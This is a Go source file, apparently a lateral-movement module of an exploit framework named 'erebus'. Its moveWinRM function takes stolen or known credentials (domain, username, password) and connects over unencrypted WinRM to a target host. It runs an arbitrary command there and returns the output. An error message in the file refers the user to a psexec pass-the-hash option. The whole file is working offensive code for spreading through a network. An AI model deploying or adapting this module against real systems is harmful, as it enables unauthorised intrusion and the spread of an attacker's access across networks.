package lateral

import (
	"bytes"
	"context"
	"fmt"

	"github.com/masterzen/winrm"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func moveWinRM(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Command == "" {
		return nil, fmt.Errorf("command required")
	}
	if cfg.Username == "" {
		return nil, fmt.Errorf("username required for WinRM")
	}
	if cfg.NtlmHash != "" {
		return nil, fmt.Errorf("winrm pass-the-hash not supported; use method=psexec with ntlm_hash or provide password for winrm")
	}
	if cfg.Password == "" {
		return nil, fmt.Errorf("password required for WinRM")
	}

	endpoint := winrm.NewEndpoint(cfg.Target, 5985, false, true, nil, nil, nil, 0)
	client, err := winrm.NewClient(endpoint, formatDomainUser(cfg.Domain, cfg.Username), cfg.Password)
	if err != nil {
		return nil, fmt.Errorf("create WinRM client: %w", err)
	}

	var stdout, stderr bytes.Buffer
	exitCode, err := client.RunWithContext(ctx, cfg.Command, &stdout, &stderr)
	if err != nil {
		return nil, fmt.Errorf("WinRM exec: %w", err)
	}

	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR:\n" + stderr.String()
	}

	return &pb.LateralMoveResult{
		Method:  "winrm",
		Target:  cfg.Target,
		Success: exitCode == 0,
		Output:  output,
	}, nil
}